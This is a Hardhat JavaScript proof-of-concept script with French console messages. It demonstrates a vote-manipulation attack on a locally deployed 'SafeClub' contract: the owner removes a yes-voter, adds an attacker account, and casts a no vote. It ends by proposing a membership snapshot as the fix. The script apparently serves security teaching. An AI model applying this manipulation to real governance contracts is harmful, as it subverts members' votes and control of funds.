import pkg from 'hardhat';
const { ethers } = pkg;

async function main() {
    const [owner, member1, member2, attacker] = await ethers.getSigners();
    const CONTRACT_ADDRESS = "0x5FbDB2315678afecb367f032d93F642f64180aa3";
    const contract = await ethers.getContractAt("SafeClub", CONTRACT_ADDRESS);
    
    console.log("==========================================");
    console.log("🚨 DÉMONSTRATION : MANIPULATION DE VOTE");
    console.log("==========================================");
    
    // Récupérer dernière proposition
    const proposalCount = await contract.nextProposalId();
    if (proposalCount === 0n) {
        console.log("❌ Aucune proposition trouvée.");
        console.log("💡 Créez d'abord une proposition dans l'interface.");
        return;
    }
    
    const proposalId = proposalCount - 1n;
    
    console.log("\n📊 ÉTAT INITIAL :");
    const proposalBefore = await contract.getProposal(proposalId);
    console.log(`Proposition #${proposalId} :`);
    console.log(`  Montant : ${ethers.formatEther(proposalBefore.amount)} ETH`);
    console.log(`  Votes OUI : ${proposalBefore.yesVotes}`);
    console.log(`  Votes NON : ${proposalBefore.noVotes}`);
    console.log(`  Majorité : ${proposalBefore.yesVotes > proposalBefore.noVotes ? '✅ OUI (Approuvée)' : '❌ NON (Rejetée)'}`);
    
    if (proposalBefore.yesVotes === 0 && proposalBefore.noVotes === 0) {
        console.log("\n⚠️  Aucun vote encore. Votez d'abord dans l'interface.");
        return;
    }
    
    console.log("\n==========================================");
    console.log("🚨 ATTAQUE : Manipulation de vote");
    console.log("==========================================");
    
    // Étape 1 : Retirer un membre qui a voté OUI
    console.log("\n1️⃣  Étape 1 : Owner retire un membre qui a voté OUI");
    console.log("   (Simulation : retrait de member2)");
    
    try {
        const isMember2 = await contract.isMember(member2.address);
        if (isMember2) {
            await contract.removeMember(member2.address);
            console.log("   ✅ member2 retiré");
        } else {
            console.log("   ⚠️  member2 n'est pas membre");
        }
    } catch (error) {
        console.log("   ⚠️  Erreur (peut-être déjà retiré)");
    }
    
    // Étape 2 : Ajouter un nouveau membre
    console.log("\n2️⃣  Étape 2 : Owner ajoute un nouveau membre (attaquant)");
    try {
        const isAttackerMember = await contract.isMember(attacker.address);
        if (!isAttackerMember) {
            await contract.addMember(attacker.address);
            console.log("   ✅ Attaquant ajouté comme membre");
        } else {
            console.log("   ⚠️  Attaquant déjà membre");
        }
    } catch (error) {
        console.log("   ⚠️  Erreur lors de l'ajout");
    }
    
    // Étape 3 : Attaquant vote NON
    console.log("\n3️⃣  Étape 3 : Attaquant vote NON");
    try {
        const hasVoted = await contract.hasVoted(proposalId, attacker.address);
        if (!hasVoted) {
            await contract.connect(attacker).vote(proposalId, false);
            console.log("   ✅ Vote NON enregistré");
        } else {
            console.log("   ⚠️  Attaquant a déjà voté");
        }
    } catch (error) {
        console.log("   ⚠️  Erreur :", error.message);
    }
    
    console.log("\n📊 ÉTAT APRÈS ATTAQUE :");
    const proposalAfter = await contract.getProposal(proposalId);
    console.log(`  Votes OUI : ${proposalAfter.yesVotes}`);
    console.log(`  Votes NON : ${proposalAfter.noVotes}`);
    console.log(`  Majorité : ${proposalAfter.yesVotes > proposalAfter.noVotes ? '✅ OUI (Approuvée)' : '❌ NON (Rejetée)'}`);
    
    console.log("\n==========================================");
    console.log("⚠️  IMPACT DE L'ATTAQUE :");
    console.log("==========================================");
    console.log("❌ Le résultat du vote a été manipulé");
    console.log("❌ La volonté démocratique est ignorée");
    console.log("❌ L'owner peut contrôler les résultats");
    console.log("\n💡 SOLUTION : Snapshot des membres au moment de création");
    console.log("   (Geler la liste des membres lors de la création)");
    console.log("==========================================");
}

main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});
